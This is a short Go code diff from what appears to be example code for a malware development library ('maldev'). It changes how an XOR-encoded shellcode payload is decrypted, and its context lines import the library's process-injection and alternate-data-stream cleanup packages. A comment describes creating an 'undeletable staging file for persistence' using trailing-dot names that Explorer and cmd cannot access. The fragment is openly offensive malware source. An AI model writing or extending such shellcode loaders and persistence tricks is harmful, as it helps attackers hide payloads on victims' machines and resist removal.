@@ -102,8 +102,8 @@ import (
     "os"
 
     "github.com/oioio-space/maldev/cleanup/ads"
+    "github.com/oioio-space/maldev/crypto"
     "github.com/oioio-space/maldev/inject"
-    "github.com/oioio-space/maldev/encode"
 )
 
 func main() {
@@ -114,7 +114,10 @@ func main() {
         log.Fatal(err)
     }
 
-    shellcode := encode.XORDecrypt(encoded, []byte("k3y"))
+    shellcode, err := crypto.XORWithRepeatingKey(encoded, []byte("k3y"))
+    if err != nil {
+        log.Fatal(err)
+    }
 
     // 2. Create an undeletable staging file for persistence.
     //    Trailing-dot names cannot be accessed or removed via Explorer / cmd.
